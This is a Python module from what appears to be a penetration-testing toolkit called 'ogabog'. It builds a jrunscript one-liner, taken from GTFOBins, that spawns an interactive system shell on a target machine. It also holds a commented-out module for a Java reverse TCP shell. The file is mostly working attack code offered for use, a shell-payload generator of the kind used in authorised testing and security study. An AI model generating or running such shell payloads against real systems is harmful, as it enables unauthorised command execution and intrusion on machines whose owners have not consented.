from ogabog.cores import plugin, const


class PTY(plugin.BaseShell):
    def __init__(self):
        super().__init__()
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.opts.description = "[Interactive][SystemShell] https://gtfobins.github.io/gtfobins/jrunscript/"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
        self.shell_type = 0
        self.is_interactive = True

    def make_shell(self):
        self.shell = f"jrunscript -e \"exec('{self.args.shell} -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""


# class ReverseTCP(plugin.ReverseShell):
#     def __init__(self):
#         super().__init__()
#         self.add_args(
#             "--shell",
#             default="bash",
#             choices=const.LINUX_SHELL,
#             help="Select shell type on target machine"
#         )
#         self.extension = "sh"
#         self.shell_type = "tcp"
#         self.set_write_file()
#         self.opts.description = "[ReverseShell][TCP] Java SE 6 PTY reverse shell.\
#          https://gtfobins.github.io/gtfobins/jrunscript/."
#         self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
